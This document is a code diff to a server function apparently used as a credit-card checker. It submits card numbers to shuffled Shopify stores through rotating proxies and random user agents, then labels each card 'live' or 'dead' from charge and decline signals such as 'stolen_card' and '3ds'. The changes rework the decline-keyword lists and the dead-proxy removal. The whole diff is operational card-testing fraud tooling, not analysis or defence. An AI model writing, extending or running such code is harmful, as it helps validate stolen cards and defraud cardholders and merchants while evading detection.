@@ -145,24 +145,9 @@ const userAgents = [
 const getRandomItem = <T>(arr: T[]): T => arr[Math.floor(Math.random() * arr.length)];
 
 const PROXY_DEAD_INDICATORS = [
-  "proxy dead", "proxy authentication", "proxy_error", "bad proxy",
-  "could not resolve proxy", "proxy auth", "407 proxy authentication",
-];
-
-const isApiTimeoutProxyDead = (rawText: string): boolean => {
-  try {
-    const json = JSON.parse(rawText);
-    const response = json.Response ?? json.response;
-    return typeof response === 'string' && response.trim().toUpperCase() === 'TIMEOUT';
-  } catch {
-    return /"?response"?\s*:\s*"TIMEOUT"/i.test(rawText);
-  }
-};
-
-const PROXY_TRANSIENT_INDICATORS = [
-  "proxy error", "connection refused", "proxy connect", "tunneling socket",
+  "proxy dead", "proxy error", "proxy authentication", "connection refused",
+  "proxy connect", "tunneling socket", "proxy_error", "bad proxy",
   "cannot connect to host", "socks", "econnrefused", "econnreset",
-  "failed to perform", "getaddrinfo", "tokenize_fail", "no_session_token",
 ];
 
 const SITE_DEAD_INDICATORS = [
@@ -210,13 +195,13 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
     const rawLower = rawText.toLowerCase();
 
     // Check for curl/DNS/transient API errors — treat as UNKNOWN (retryable)
-    const isCurlTransient = PROXY_TRANSIENT_INDICATORS.some(ind => rawLower.includes(ind));
+    const isCurlTransient = rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token');
     if (isCurlTransient) {
       return { status: 'unknown', message: 'Transient error (retryable)', apiResponse: '', rawResponse: rawText, price: 0, priceStr: '$0.00' };
     }
 
     // Check for proxy dead indicators FIRST
-    const isProxyDead = PROXY_DEAD_INDICATORS.some(ind => rawLower.includes(ind)) || isApiTimeoutProxyDead(rawText);
+    const isProxyDead = PROXY_DEAD_INDICATORS.some(ind => rawLower.includes(ind));
     if (isProxyDead) {
       return { status: 'dead', message: 'Proxy Dead', apiResponse: 'Proxy Dead', rawResponse: rawText, price: 0, priceStr: '$0.00', proxyDead: true };
     }
@@ -273,28 +258,8 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
 
       // If the API returned an empty/meaningless response, treat as unknown
       const responseText = (apiResponse || apiMessage || '').trim();
-      const declineSignals = [
-        'declined', 'card_declined', 'invalid', 'expired', 'insufficient', 'incorrect',
-        'do_not_honor', 'fraud', 'not accepted', 'ds_required', '3ds', '3d_secure',
-        'rejected', 'otp_required', 'otp required', 'pickup_card', 'lost_card',
-        'stolen_card', 'restricted', 'not_permitted', 'generic_decline', 'failed',
-      ];
-
-      const chargedValue = json.Charged ?? json.charged;
-      const chargedNormalized = typeof chargedValue === 'string' ? chargedValue.trim().toLowerCase() : chargedValue;
-      const combinedText = ((json.status || '') + ' ' + responseText).toLowerCase();
-
       if (isEmptyOrErrorOnly(responseText) && price === 0) {
         apiStatus = 'unknown';
-      } else if (chargedNormalized === false || chargedNormalized === 'false') {
-        apiStatus = 'dead';
-        apiMessage = json.message || json.error || json.Response || 'Declined';
-      } else if (declineSignals.some(signal => combinedText.includes(signal))) {
-        apiStatus = 'dead';
-        apiMessage = json.message || json.error || json.Response || 'Declined';
-      } else if (chargedNormalized === true || chargedNormalized === 'true') {
-        apiStatus = 'live';
-        apiMessage = json.message || json.Response || 'Charged';
       } else if (json.status === 'CHARGED' || json.status === 'success' || json.full_response === true || json.status === 'ORDER_COMPLETED' || json.Response === 'ORDER_COMPLETED' || json.Response === 'Order completed 💎') {
         apiStatus = 'live';
         apiMessage = json.message || json.Response || 'Charged';
@@ -316,14 +281,20 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
         const responseLower = (apiResponse || '').toLowerCase();
         const combinedText = lower + ' ' + responseLower;
         
-        if (declineSignals.some(signal => combinedText.includes(signal))) {
-          apiStatus = 'dead';
-        } else if (combinedText.includes('order_placed') || combinedText.includes('order placed') || 
+        if (combinedText.includes('order_placed') || combinedText.includes('order placed') || 
             combinedText.includes('order completed') || combinedText.includes('order_completed') ||
             combinedText.includes('thank you') || combinedText.includes('thankyou') ||
             combinedText.includes('charged') || combinedText.includes('success') || 
             combinedText.includes('approved')) {
           apiStatus = 'live';
+        } else if (combinedText.includes('declined') || combinedText.includes('invalid') || combinedText.includes('expired') || 
+                   combinedText.includes('insufficient') || combinedText.includes('card_declined') || combinedText.includes('incorrect') ||
+                   combinedText.includes('do_not_honor') || combinedText.includes('fraud') || combinedText.includes('not accepted') ||
+                   combinedText.includes('ds_required') || combinedText.includes('3ds') || combinedText.includes('3d_secure') ||
+                   combinedText.includes('rejected') || combinedText.includes('otp_required') || combinedText.includes('otp required') ||
+                   combinedText.includes('pickup_card') || combinedText.includes('lost_card') || combinedText.includes('stolen_card') ||
+                   combinedText.includes('restricted') || combinedText.includes('not_permitted') || combinedText.includes('generic_decline')) {
+          apiStatus = 'dead';
         } else if (combinedText.includes('failed') || combinedText.includes('error')) {
           const substantive = combinedText.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
           if (substantive.length > 3) {
@@ -333,24 +304,15 @@ const callApiOnce = async (cc: string, site: string, proxy: string): Promise<Api
       }
     } catch {
       const lower = rawText.toLowerCase();
-      const rawChargedFalse = /"?charged"?\s*:\s*"?false"?/i.test(rawText);
-      const rawChargedTrue = /"?charged"?\s*:\s*"?true"?/i.test(rawText);
       if (isEmptyOrErrorOnly(lower)) {
         apiStatus = 'unknown';
-      } else if (rawChargedFalse) {
-        apiStatus = 'dead';
-      } else if (rawChargedTrue) {
-        apiStatus = 'live';
-      } else if (lower.includes('declined') || lower.includes('card_declined') || lower.includes('invalid') || lower.includes('expired') || 
-          lower.includes('insufficient') || lower.includes('incorrect') || lower.includes('do_not_honor') || lower.includes('fraud') ||
-          lower.includes('not accepted') || lower.includes('ds_required') || lower.includes('3ds') || lower.includes('3d_secure') ||
-          lower.includes('rejected') || lower.includes('otp_required') || lower.includes('otp required') || lower.includes('pickup_card') ||
-          lower.includes('lost_card') || lower.includes('stolen_card') || lower.includes('restricted') || lower.includes('not_permitted') ||
-          lower.includes('generic_decline') || lower.includes('failed')) {
-        apiStatus = 'dead';
       } else if (lower.includes('order_placed') || lower.includes('order placed') || lower.includes('order completed') || lower.includes('order_completed') ||
           lower.includes('thank you') || lower.includes('charged') || lower.includes('success') || lower.includes('approved')) {
         apiStatus = 'live';
+      } else if (lower.includes('declined') || lower.includes('invalid') || lower.includes('expired') || 
+                 lower.includes('insufficient') || lower.includes('otp_required') || lower.includes('otp required') ||
+                 lower.includes('ds_required') || lower.includes('3ds') || lower.includes('rejected')) {
+        apiStatus = 'dead';
       } else if (lower.includes('failed') || lower.includes('error')) {
         const substantive = lower.replace(/error:?\s*/g, '').replace(/failed:?\s*/g, '').trim();
         if (substantive.length > 3) {
@@ -519,7 +481,6 @@ Deno.serve(async (req) => {
     let result: ApiCheckResult | null = null;
     let usedSite = shuffledSites[0];
     const failedProxyIds: string[] = [];
-    const failedProxyDebugs: string[] = [];
     const deadSiteUrls: string[] = [];
     let allProxiesDeadFlag = false;
 
@@ -533,7 +494,7 @@ Deno.serve(async (req) => {
       const availableProxies = shuffledProxies.filter(p => !failedProxyIds.includes(p.id));
       if (availableProxies.length === 0) {
         allProxiesDeadFlag = true;
-        result = { status: 'unknown', message: 'All proxies failed', apiResponse: '', rawResponse: failedProxyDebugs.join('\n\n'), price: 0, priceStr: '$0.00' };
+        result = { status: 'unknown', message: 'All proxies failed (407)', apiResponse: '', rawResponse: '', price: 0, priceStr: '$0.00' };
         break;
       }
 
@@ -545,22 +506,14 @@ Deno.serve(async (req) => {
         
         siteResult = await callApi(cc, currentSite.url, proxyStr);
         
-        // If proxy dead flag is set, skip this proxy for this run only and try next
+        // If proxy dead flag is set, remove proxy and try next
         if (siteResult.proxyDead) {
           console.log(`[SHOPIFY-CHARGE] Proxy dead detected, removing proxy ${currentProxy.id} (${currentProxy.ip}:${currentProxy.port})`);
           failedProxyIds.push(currentProxy.id);
-          failedProxyDebugs.push(`Proxy ${currentProxy.ip}:${currentProxy.port}\nSite: ${currentSite.url}\nRaw API: ${siteResult.rawResponse || siteResult.message || 'N/A'}`);
-          sendAdminDebug(
-            cc,
-            'proxy dead',
-            `Proxy removed: ${currentProxy.ip}:${currentProxy.port}`,
-            siteResult.rawResponse || siteResult.message || 'N/A',
-            profile?.username || user.email,
-            currentSite.url
-          );
-          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).eq('user_id', user.id).then(({ error: delErr }) => {
-            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove dead proxy:`, delErr);
-            else console.log(`[SHOPIFY-CHARGE] Dead proxy removed: ${currentProxy.ip}:${currentProxy.port}`);
+          // Immediately delete from DB
+          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).then(({ error: delErr }) => {
+            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove dead proxy ${currentProxy.id}:`, delErr);
+            else console.log(`[SHOPIFY-CHARGE] Dead proxy removed from DB: ${currentProxy.id}`);
           });
           continue; // try next proxy
         }
@@ -588,7 +541,7 @@ Deno.serve(async (req) => {
           break;
         }
 
-        // Legacy proxy error check (407/auth only without proxyDead flag)
+        // Legacy proxy error check (407, connection refused without proxyDead flag)
         const rawLower = (siteResult.rawResponse || '').toLowerCase();
         let isValidApiResponse = false;
         try {
@@ -599,25 +552,17 @@ Deno.serve(async (req) => {
         } catch { /* not valid JSON */ }
         
         const isProxyError = !isValidApiResponse && (
-          rawLower.includes('407') || rawLower.includes('proxy authentication') ||
-          rawLower.includes('bad proxy')
+          rawLower.includes('407') || rawLower.includes('proxy error') || 
+          rawLower.includes('proxy authentication') || rawLower.includes('connection refused') ||
+          rawLower.includes('proxy connect') || rawLower.includes('tunneling socket')
         );
         
         if (isProxyError) {
           console.log(`[SHOPIFY-CHARGE] Proxy error (legacy), removing proxy ${currentProxy.ip}:${currentProxy.port}`);
           failedProxyIds.push(currentProxy.id);
-          failedProxyDebugs.push(`Proxy ${currentProxy.ip}:${currentProxy.port}\nSite: ${currentSite.url}\nRaw API: ${siteResult.rawResponse || siteResult.message || 'N/A'}`);
-          sendAdminDebug(
-            cc,
-            'proxy dead',
-            `Proxy removed: ${currentProxy.ip}:${currentProxy.port}`,
-            siteResult.rawResponse || siteResult.message || 'N/A',
-            profile?.username || user.email,
-            currentSite.url
-          );
-          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).eq('user_id', user.id).then(({ error: delErr }) => {
-            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove dead proxy:`, delErr);
-            else console.log(`[SHOPIFY-CHARGE] Dead proxy removed: ${currentProxy.ip}:${currentProxy.port}`);
+          adminClient.from('user_proxies').delete().eq('id', currentProxy.id).then(({ error: delErr }) => {
+            if (delErr) console.error(`[SHOPIFY-CHARGE] Failed to remove proxy ${currentProxy.id}:`, delErr);
+            else console.log(`[SHOPIFY-CHARGE] Removed dead proxy: ${currentProxy.id}`);
           });
           continue; // try next proxy
         }
@@ -795,16 +740,7 @@ Deno.serve(async (req) => {
       (result.apiResponse || result.message || '').trim().toLowerCase() === 'error:' && 
       result.price === 0;
     
-    if (allProxiesDead && failedProxyDebugs.length > 0) {
-      sendAdminDebug(
-        cc,
-        'all proxies dead',
-        `All ${failedProxyIds.length}/${userProxies.length} proxies failed and were removed`,
-        failedProxyDebugs.join('\n\n━━━━ PROXY RAW RESPONSE ━━━━\n\n'),
-        profile?.username || user.email,
-        randomSite.url
-      );
-    } else if (result.status !== 'dead' || isSuspiciousError) {
+    if (result.status !== 'dead' || isSuspiciousError) {
       sendAdminDebug(
         cc,
         isSuspiciousError ? 'suspicious' : result.status,
